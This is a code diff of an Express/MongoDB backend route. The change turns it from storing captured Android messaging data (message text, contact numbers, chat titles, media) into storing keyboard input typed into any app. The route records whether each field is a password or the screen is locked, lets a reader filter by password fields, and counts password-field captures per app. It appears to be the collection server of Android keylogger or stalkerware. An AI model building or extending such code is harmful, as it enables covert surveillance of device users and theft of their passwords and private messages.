@@ -15,40 +15,28 @@ router.post('/', authenticateApiKey, async (req, res) => {
             packageName,
             appName,
             deviceId,
-            messageId,
-            // Essential message content
-            text,
-            completeMessage,
-            eventType,
-            // Contact & Conversation Information
-            contactName,
-            contactNumber,
-            chatTitle,
-            conversationName,
-            recipientInfo,
-            isGroupChat,
-            participantCount,
-            // Media information
-            hasMedia,
-            mediaType,
-            mediaFileName,
-            mediaUploaded,
-            mediaDownloadUrl,
-            // Basic UI info
+            // KEYBOARD INPUT DATA (PRIMARY FOCUS)
+            keyboardInput,
+            inputField,
+            inputType,
+            // CONTEXT INFORMATION (MINIMAL)
+            screenTitle,
+            fieldHint,
             isPassword,
-            isEditable,
-            // Device info
+            isScreenLocked,
+            // APP CONTEXT (MINIMAL)
+            activityName,
+            viewId,
+            // DEVICE INFO (MINIMAL)
             deviceModel,
-            androidVersion,
-            // Custom metadata
-            customMetadata
+            androidVersion
         } = req.body;
 
         // Validate required fields
-        if (!id || !packageName || !appName || !text || !eventType || !deviceId) {
+        if (!id || !packageName || !appName || !keyboardInput || !deviceId) {
             return res.status(400).json({
                 success: false,
-                message: 'Missing required fields: id, packageName, appName, text, eventType, deviceId'
+                message: 'Missing required fields: id, packageName, appName, keyboardInput, deviceId'
             });
         }
 
@@ -65,69 +53,44 @@ router.post('/', authenticateApiKey, async (req, res) => {
             return value;
         };
 
-        // Build id from messageId when provided to keep one record per message
-        const effectiveId = (req.body.customMetadata && req.body.customMetadata.messageId)
-            ? `${packageName}:${req.body.customMetadata.messageId}`
-            : id;
-
-        // Create text input data matching the Android app's simplified model
+        // Create text input data matching the simplified keyboard input model
         const incoming = {
-            id: sanitizeValue(effectiveId),
+            id: sanitizeValue(id),
             timestamp: timestamp ? new Date(timestamp) : new Date(),
             packageName: sanitizeValue(packageName),
             appName: sanitizeValue(appName),
             deviceId: sanitizeValue(deviceId),
-            messageId: sanitizeValue(messageId),
             
-            // Essential message content
-            text: sanitizeValue(text) || '',
-            completeMessage: sanitizeValue(completeMessage) || '',
-            eventType: sanitizeValue(eventType),
+            // KEYBOARD INPUT DATA (PRIMARY FOCUS)
+            keyboardInput: sanitizeValue(keyboardInput) || '',
+            inputField: sanitizeValue(inputField) || 'text_input',
+            inputType: sanitizeValue(inputType) || 'text',
             
-            // Contact & Conversation Information
-            contactName: sanitizeValue(contactName) || null,
-            contactNumber: sanitizeValue(contactNumber) || null,
-            chatTitle: sanitizeValue(chatTitle) || null,
-            conversationName: sanitizeValue(conversationName) || null,
-            recipientInfo: sanitizeValue(recipientInfo) || null,
-            isGroupChat: isGroupChat || false,
-            participantCount: participantCount || 0,
-            
-            // Media information
-            hasMedia: hasMedia || false,
-            mediaType: sanitizeValue(mediaType) || null,
-            mediaFileName: sanitizeValue(mediaFileName) || null,
-            mediaUploaded: mediaUploaded || false,
-            mediaDownloadUrl: sanitizeValue(mediaDownloadUrl) || null,
-            
-            // Basic UI info
+            // CONTEXT INFORMATION (MINIMAL)
+            screenTitle: sanitizeValue(screenTitle) || null,
+            fieldHint: sanitizeValue(fieldHint) || null,
             isPassword: isPassword || false,
-            isEditable: isEditable || false,
+            isScreenLocked: isScreenLocked || false,
             
-            // Device info
+            // APP CONTEXT (MINIMAL)
+            activityName: sanitizeValue(activityName) || '',
+            viewId: sanitizeValue(viewId) || '',
+            
+            // DEVICE INFO (MINIMAL)
             deviceModel: sanitizeValue(deviceModel) || '',
-            androidVersion: sanitizeValue(androidVersion) || '',
-            
-            // Custom metadata
-            customMetadata: sanitizeValue(customMetadata) || {}
+            androidVersion: sanitizeValue(androidVersion) || ''
         };
 
         console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));
 
-        // Preserve longest text/completeMessage per id to avoid overwriting full message with partials
+        // Preserve longest keyboardInput per id to avoid overwriting full input with partials
         const existing = await TextInput.findOne({ id: incoming.id }).lean();
         if (existing) {
-            const existingTextLen = (existing.text || '').length;
-            const incomingTextLen = (incoming.text || '').length;
-            if (incomingTextLen < existingTextLen) {
-                console.log(`↩️ Incoming text shorter (${incomingTextLen}) than existing (${existingTextLen}) for id=${incoming.id}. Keeping existing text.`);
-                incoming.text = existing.text;
-            }
-            const existingCMlen = (existing.completeMessage || '').length;
-            const incomingCMlen = (incoming.completeMessage || '').length;
-            if (incomingCMlen < existingCMlen) {
-                console.log(`↩️ Incoming completeMessage shorter (${incomingCMlen}) than existing (${existingCMlen}) for id=${incoming.id}. Keeping existing completeMessage.`);
-                incoming.completeMessage = existing.completeMessage;
+            const existingInputLen = (existing.keyboardInput || '').length;
+            const incomingInputLen = (incoming.keyboardInput || '').length;
+            if (incomingInputLen < existingInputLen) {
+                console.log(`↩️ Incoming keyboardInput shorter (${incomingInputLen}) than existing (${existingInputLen}) for id=${incoming.id}. Keeping existing input.`);
+                incoming.keyboardInput = existing.keyboardInput;
             }
         }
 
@@ -142,12 +105,13 @@ router.post('/', authenticateApiKey, async (req, res) => {
 
         res.status(200).json({
             success: true,
-            message: 'Text input saved successfully',
+            message: 'Keyboard input saved successfully',
             data: {
                 id: result._id,
                 textInputId: result.id,
-                text: result.text,
-                completeMessage: result.completeMessage,
+                keyboardInput: result.keyboardInput,
+                inputField: result.inputField,
+                inputType: result.inputType,
                 packageName: result.packageName,
                 appName: result.appName,
                 timestamp: result.timestamp
@@ -194,8 +158,8 @@ router.get('/', authenticateApiKey, async (req, res) => {
             deviceId, 
             startDate, 
             endDate,
-            hasMedia,
-            isGroupChat,
+            isPassword,
+            inputType,
             search 
         } = req.query;
 
@@ -204,8 +168,8 @@ router.get('/', authenticateApiKey, async (req, res) => {
         
         if (packageName) filter.packageName = packageName;
         if (deviceId) filter.deviceId = deviceId;
-        if (hasMedia !== undefined) filter.hasMedia = hasMedia === 'true';
-        if (isGroupChat !== undefined) filter.isGroupChat = isGroupChat === 'true';
+        if (isPassword !== undefined) filter.isPassword = isPassword === 'true';
+        if (inputType) filter.inputType = inputType;
         
         // Date range filter
         if (startDate || endDate) {
@@ -217,10 +181,10 @@ router.get('/', authenticateApiKey, async (req, res) => {
         // Text search
         if (search) {
             filter.$or = [
-                { text: { $regex: search, $options: 'i' } },
-                { completeMessage: { $regex: search, $options: 'i' } },
-                { contactName: { $regex: search, $options: 'i' } },
-                { chatTitle: { $regex: search, $options: 'i' } }
+                { keyboardInput: { $regex: search, $options: 'i' } },
+                { inputField: { $regex: search, $options: 'i' } },
+                { screenTitle: { $regex: search, $options: 'i' } },
+                { fieldHint: { $regex: search, $options: 'i' } }
             ];
         }
 
@@ -281,25 +245,23 @@ router.get('/stats', authenticateApiKey, async (req, res) => {
             {
                 $group: {
                     _id: null,
-                    totalTextInputs: { $sum: 1 },
+                    totalKeyboardInputs: { $sum: 1 },
                     uniqueApps: { $addToSet: '$packageName' },
                     uniqueDevices: { $addToSet: '$deviceId' },
-                    mediaCount: { $sum: { $cond: ['$hasMedia', 1, 0] } },
-                    groupChatCount: { $sum: { $cond: ['$isGroupChat', 1, 0] } },
-                    avgTextLength: { $avg: { $strLenCP: '$text' } },
-                    avgParticipantCount: { $avg: '$participantCount' }
+                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
+                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } },
+                    inputTypes: { $addToSet: '$inputType' }
                 }
             },
             {
                 $project: {
                     _id: 0,
-                    totalTextInputs: 1,
+                    totalKeyboardInputs: 1,
                     uniqueApps: { $size: '$uniqueApps' },
                     uniqueDevices: { $size: '$uniqueDevices' },
-                    mediaCount: 1,
-                    groupChatCount: 1,
-                    avgTextLength: { $round: ['$avgTextLength', 2] },
-                    avgParticipantCount: { $round: ['$avgParticipantCount', 2] }
+                    passwordFields: 1,
+                    avgInputLength: { $round: ['$avgInputLength', 2] },
+                    inputTypes: { $size: '$inputTypes' }
                 }
             }
         ]);
@@ -312,8 +274,8 @@ router.get('/stats', authenticateApiKey, async (req, res) => {
                     _id: '$packageName',
                     count: { $sum: 1 },
                     appName: { $first: '$appName' },
-                    hasMedia: { $sum: { $cond: ['$hasMedia', 1, 0] } },
-                    isGroupChat: { $sum: { $cond: ['$isGroupChat', 1, 0] } }
+                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
+                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } }
                 }
             },
             { $sort: { count: -1 } },
@@ -324,13 +286,12 @@ router.get('/stats', authenticateApiKey, async (req, res) => {
             success: true,
             data: {
                 stats: stats[0] || {
-                    totalTextInputs: 0,
+                    totalKeyboardInputs: 0,
                     uniqueApps: 0,
                     uniqueDevices: 0,
-                    mediaCount: 0,
-                    groupChatCount: 0,
-                    avgTextLength: 0,
-                    avgParticipantCount: 0
+                    passwordFields: 0,
+                    avgInputLength: 0,
+                    inputTypes: 0
                 },
                 appBreakdown
             }
